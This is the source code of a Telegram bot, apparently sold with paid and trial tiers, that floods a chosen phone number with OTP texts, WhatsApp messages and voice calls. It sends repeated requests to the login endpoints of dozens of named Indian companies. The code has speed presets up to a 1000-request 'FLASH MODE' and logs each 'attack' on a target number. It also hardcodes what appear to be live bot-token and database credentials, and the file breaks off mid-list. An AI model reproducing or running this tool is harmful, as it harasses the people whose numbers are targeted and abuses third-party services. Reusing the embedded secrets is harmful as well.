import asyncio
import aiohttp
import json
import re
import time
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import logging
from pathlib import Path
from typing import Optional
import html
import motor.motor_asyncio
from pymongo import MongoClient
import certifi
import os

# Bot configuration
BOT_TOKEN = "8448343135:AAEP7CjK4cI4SoeR16ytrG2ytjkncpkTKPw"

# MongoDB configuration
MONGODB_URI = "mongodb+srv://nikilsaxena843_db_user:3gF2wyT4IjsFt0cY@vipbot.puv6gfk.mongodb.net/?appName=vipbot"
DATABASE_NAME = "bomb_bot"
COLLECTION_USERS = "authorized_users"
COLLECTION_LOGS = "attack_logs"
COLLECTION_SETTINGS = "user_settings"

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# =============== MONGODB CONNECTION ===============
class MongoDB:
    client: motor.motor_asyncio.AsyncIOMotorClient = None
    db = None
    
    @classmethod
    async def connect(cls):
        """Create MongoDB connection"""
        try:
            # Use certifi for SSL certificates
            cls.client = motor.motor_asyncio.AsyncIOMotorClient(
                MONGODB_URI,
                tlsCAFile=certifi.where(),
                serverSelectionTimeoutMS=5000
            )
            # Test connection
            await cls.client.admin.command('ping')
            cls.db = cls.client[DATABASE_NAME]
            
            # Create indexes for better performance
            await cls.db[COLLECTION_USERS].create_index("user_id", unique=True)
            await cls.db[COLLECTION_USERS].create_index("username")
            await cls.db[COLLECTION_LOGS].create_index("user_id")
            await cls.db[COLLECTION_LOGS].create_index("start_time")
            await cls.db[COLLECTION_SETTINGS].create_index("user_id", unique=True)
            
            print("✅ MongoDB Connected Successfully!")
            return True
        except Exception as e:
            print(f"❌ MongoDB Connection Failed: {e}")
            return False
    
    @classmethod
    async def close(cls):
        """Close MongoDB connection"""
        if cls.client:
            cls.client.close()
            print("🔌 MongoDB Connection Closed")

# Initialize MongoDB instance
mongo = MongoDB()

def clean_text(text: str) -> str:
    """Clean special characters and emojis from text"""
    if not text:
        return ""
    
    # Remove control characters and excessive special chars
    cleaned = re.sub(r'[\x00-\x1F\x7F-\x9F\u200B-\u200F\u2028-\u202F\u2060-\u206F]', '', text)
    # Keep only basic characters
    cleaned = re.sub(r'[^\w\s\-@\._#&]', '', cleaned, flags=re.UNICODE)
    return cleaned.strip()[:50]  # Limit length

async def add_authorized_user(user_id: int, username: str, display_name: str, added_by: int, is_paid: bool = False):
    """Add user to authorized list with cleaned text"""
    # Clean the inputs
    clean_username = clean_text(username)
    clean_display_name = clean_text(display_name)
    
    user_data = {
        "user_id": user_id,
        "username": clean_username,
        "display_name": clean_display_name,
        "added_at": datetime.now().isoformat(),
        "added_by": added_by,
        "trial_used_count": 0,
        "last_trial_used": None,
        "is_trial_blocked": False,
        "is_paid_user": is_paid
    }
    
    if is_paid:
        user_data["is_trial_blocked"] = True
    
    # Update if exists, insert if not
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {"$set": user_data},
        upsert=True
    )

async def remove_authorized_user(user_id: int):
    """Remove user from authorized list"""
    await mongo.db[COLLECTION_USERS].delete_one({"user_id": user_id})
    await mongo.db[COLLECTION_SETTINGS].delete_one({"user_id": user_id})

async def is_user_authorized(user_id: int) -> bool:
    """Check if user is authorized (paid user)"""
    user = await mongo.db[COLLECTION_USERS].find_one({"user_id": user_id})
    return user is not None and user.get("is_paid_user", False)

async def can_user_use_trial(user_id: int) -> tuple[bool, str]:
    """Check if user can use trial (once per week) - STRICT CHECK"""
    user = await mongo.db[COLLECTION_USERS].find_one({"user_id": user_id})
    
    # If user doesn't exist, they can use trial once
    if not user:
        return True, "First-time user, trial available"
    
    trial_used_count = user.get("trial_used_count", 0)
    is_trial_blocked = user.get("is_trial_blocked", False)
    is_paid_user = user.get("is_paid_user", False)
    
    # Check if user is paid user
    if is_paid_user:
        return False, "Paid users cannot use trial"
    
    # Check if trial is blocked
    if is_trial_blocked:
        return False, "Trial permanently blocked after first use"
    
    # If never used trial
    if trial_used_count == 0:
        return True, "First trial available"
    
    return False, "Trial already used"

async def mark_trial_used(user_id: int):
    """Mark trial as used for user - PERMANENTLY BLOCK after first use"""
    current_time = datetime.now().isoformat()
    
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {
            "$inc": {"trial_used_count": 1},
            "$set": {
                "last_trial_used": current_time,
                "is_trial_blocked": True
            }
        }
    )
    logger.info(f"Trial marked as used for user {user_id} - PERMANENTLY BLOCKED")

async def block_user_trial(user_id: int):
    """Permanently block trial for user"""
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {"$set": {"is_trial_blocked": True}}
    )
    logger.info(f"Trial blocked for user {user_id}")

async def unblock_user_trial(user_id: int):
    """Unblock trial for user"""
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {"$set": {"is_trial_blocked": False}}
    )
    logger.info(f"Trial unblocked for user {user_id}")

async def reset_user_trial(user_id: int):
    """Reset user's trial (admin only)"""
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {
            "$set": {
                "trial_used_count": 0,
                "last_trial_used": None,
                "is_trial_blocked": False
            }
        }
    )
    logger.info(f"Trial reset for user {user_id}")

async def get_user_trial_info(user_id: int) -> dict:
    """Get user's trial information"""
    user = await mongo.db[COLLECTION_USERS].find_one({"user_id": user_id})
    
    if not user:
        return {
            'trial_used_count': 0,
            'last_trial_used': None,
            'is_trial_blocked': False,
            'is_paid_user': False,
            'display_name': '',
            'trial_available': True,
            'exists': False
        }
    
    trial_used_count = user.get("trial_used_count", 0)
    last_trial_used = user.get("last_trial_used")
    is_trial_blocked = user.get("is_trial_blocked", False)
    is_paid_user = user.get("is_paid_user", False)
    display_name = user.get("display_name", "")
    
    # Check if trial is available
    trial_available = False
    if not is_trial_blocked and not is_paid_user:
        if trial_used_count == 0:
            trial_available = True
    
    return {
        'trial_used_count': trial_used_count,
        'last_trial_used': last_trial_used,
        'is_trial_blocked': is_trial_blocked,
        'is_paid_user': is_paid_user,
        'display_name': display_name,
        'trial_available': trial_available,
        'exists': True
    }

async def get_all_authorized_users():
    """Get all authorized users"""
    cursor = mongo.db[COLLECTION_USERS].find().sort("added_at", -1)
    users = await cursor.to_list(length=None)
    
    # Format for compatibility with existing code
    formatted_users = []
    for user in users:
        formatted_users.append((
            user.get("user_id"),
            user.get("username", ""),
            user.get("display_name", ""),
            user.get("added_at", ""),
            user.get("trial_used_count", 0),
            user.get("last_trial_used"),
            user.get("is_trial_blocked", False),
            user.get("is_paid_user", False)
        ))
    
    return formatted_users

async def get_user_speed_settings(user_id: int):
    """Get user's speed settings"""
    settings = await mongo.db[COLLECTION_SETTINGS].find_one({"user_id": user_id})
    
    if settings:
        return {
            'speed_level': settings.get('speed_level', 3),
            'max_concurrent': settings.get('max_concurrent', 10),
            'delay': settings.get('delay_between_requests', 0.1)
        }
    else:
        # Default settings
        default_settings = {
            'speed_level': 3,
            'max_concurrent': 10,
            'delay': 0.1
        }
        await set_user_speed_settings(user_id, default_settings)
        return default_settings

async def set_user_speed_settings(user_id: int, settings: dict):
    """Set user's speed settings"""
    settings_data = {
        "user_id": user_id,
        "speed_level": settings['speed_level'],
        "max_concurrent": settings['max_concurrent'],
        "delay_between_requests": settings['delay'],
        "updated_at": datetime.now().isoformat()
    }
    
    await mongo.db[COLLECTION_SETTINGS].update_one(
        {"user_id": user_id},
        {"$set": settings_data},
        upsert=True
    )

async def log_attack(user_id: int, target_number: str, duration: int, requests_sent: int, 
                     success: int, failed: int, start_time: datetime, end_time: datetime, 
                     status: str, is_trial_attack: bool = False):
    """Log attack details to database"""
    log_data = {
        "user_id": user_id,
        "target_number": target_number,
        "duration_seconds": duration,
        "requests_sent": requests_sent,
        "requests_success": success,
        "requests_failed": failed,
        "start_time": start_time.isoformat(),
        "end_time": end_time.isoformat(),
        "status": status,
        "is_trial_attack": is_trial_attack,
        "timestamp": datetime.now().isoformat()
    }
    
    await mongo.db[COLLECTION_LOGS].insert_one(log_data)

# Speed level presets (unchanged)
SPEED_PRESETS = {
    1: {  # Very Slow (Safe Mode)
        'name': '🐢 Very Slow',
        'max_concurrent': 30,
        'delay': 0.5,
        'description': 'Slowest speed, safest for testing',
        'emoji': '🐢'
    },
    2: {  # Slow
        'name': '🚶 Slow',
        'max_concurrent': 50,
        'delay': 0.3,
        'description': 'Slow speed, stable connections',
        'emoji': '🚶'
    },
    3: {  # Medium (Default)
        'name': '⚡ Medium',
        'max_concurrent': 100,
        'delay': 0.1,
        'description': 'Balanced speed and stability',
        'emoji': '⚡'
    },
    4: {  # Fast
        'name': '🚀 Fast',
        'max_concurrent': 200,
        'delay': 0.05,
        'description': 'Fast speed for quick attacks',
        'emoji': '🚀'
    },
    5: {  # Ultra Fast (Flash Attack)
        'name': '⚡💥 FLASH MODE',
        'max_concurrent': 1000,
        'delay': 0.001,
        'description': 'FLASH ATTACK - Maximum speed, all APIs at once',
        'emoji': '⚡💥'
    }
}

# =============== ALL APIs START ===============
APIS = [
    # ============ ORIGINAL API FROM t1est.txt ============
    {
        "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 100
    },
    # Voice Call APIs from t1est.txt
    {
        "name": "Tata Capital Voice Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}',
        "count": 10
    },
    {
        "name": "1MG Voice Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}',
        "count": 10
    },
    {
        "name": "Swiggy Call Verification",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 10
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 10
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 10
    },
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp",
        "count": 10
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 10
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice",
        "count": 10
    },
    {
        "name": "MakeMyTrip Voice Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 10
    },
    {
        "name": "Goibibo Voice Call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 10
    },
    {
        "name": "Ola Voice Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 10
    },
    {
        "name": "Uber Voice Call",
        "url": "https://auth.uber.com/v2/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 10
    },
    # WhatsApp APIs from t1est.txt
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}',
        "count": 10
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}',
        "count": 10
    },
    {
        "name": "Stratzy WhatsApp",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}',
        "count": 10
    },
    {
        "name": "Jockey WhatsApp",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 10
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}',
        "count": 10
    },
    # SMS APIs from t1est.txt (First batch)
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN",
        "count": 15
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Byju's SMS",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}',
        "count": 15
    },
    {
        "name": "Meru Cab",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}",
        "count": 15
    },
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}',
        "count": 15
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}',
        "count": 15
    },
    {
        "name": "Dayco India",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp",
        "count": 15
    },
    {
        "name": "BeepKart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}',
        "count": 15
    },
    {
        "name": "Lending Plate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobiles={phone}&resend=Resend",
        "count": 15
    },
    {
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}',
        "count": 15
    },
    {
        "name": "GoKwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}',
        "count": 15
    },
    {
        "name": "NewMe",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}',
        "count": 15
    },
    {
        "name": "Univest",
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 15
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}',
        "count": 15
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}',
        "count": 15
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}',
        "count": 15
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"contact_no":"{phone}"}}',
        "count": 15
    },
    {
        "name": "ServeTel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        "data": lambda phone: f"mobile_number={phone}",
        "count": 15
    },
    {
        "name": "GoPink Cabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"check_mobile_number=1&contact={phone}",
        "count": 15
    },
    {
        "name": "Shemaroome",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile_no=%2B91{phone}",
        "count": 15
    },
    {
        "name": "Cossouq",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobilenumber={phone}&otptype=register",
        "count": 15
    },
    {
        "name": "MyImagineStore",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile={phone}",
        "count": 15
    },
    {
        "name": "Otpless",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}',
        "count": 15
    },
    {
        "name": "MyHubble Money",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}',
        "count": 15
    },
    {
        "name": "Tata Capital Business",
        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}',
        "count": 15
    },
    {
        "name": "DealShare",
        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}',
        "count": 15
    },
    {
        "name": "Snapmint",
        "url": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Housing.com",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}',
        "count": 15
    },
    {
        "name": "RentoMojo",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Khatabook",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}',
        "count": 15
    },
    {
        "name": "Netmeds",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa",
        "count": 15
    },
    {
        "name": "RummyCircle",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}',
        "count": 15
    },
    {
        "name": "Animall",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}',
        "count": 15
    },
    {
        "name": "Entri",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Cosmofeed",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}',
        "count": 15
    },
    {
        "name": "Aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}',
        "count": 15
    },
    {
        "name": "Revv",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}',
        "count": 15
    },
    {
        "name": "DeHaat",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}',
        "count": 15
    },
    {
        "name": "A23 Games",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}',
        "count": 15
    },
    {
        "name": "Spencer's",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "PayMe India",
        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}',
        "count": 15
    },
    {
        "name": "Shopper's Stop",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}',
        "count": 15
    },
    {
        "name": "Hyuga Auth",
        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "BigCash",
        "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
        "method": "GET",
        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
        "data": None,
        "count": 15
    },
    {
        "name": "Lifestyle Stores",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}',
        "count": 15
    },
    {
        "name": "WorkIndia",
        "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 15
    },
    {
        "name": "PokerBaazi",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}',
        "count": 15
    },
    {
        "name": "My11Circle",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "MamaEarth",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "HomeTriangle",
        "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Wellness Forever",
        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"method=firstRegisterApi&data={{\"customerMobile\":\"{phone}\",\"generateOtp\":\"true\"}}",
        "count": 15
    },
    {
        "name": "HealthMug",
        "url": "https://api.healthmug.com/account/createotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Vyapar",
        "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 15
    },
    {
        "name": "Kredily",
        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Tata Motors",
        "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}',
        "count": 15
    },
    {
        "name": "Moglix",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}',
        "count": 15
    },
    {
        "name": "MyGov",
        "url": lambda phone: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 15
    },
    {
        "name": "TrulyMadly",
        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}',
        "count": 15
    },
    {
        "name": "Apna",
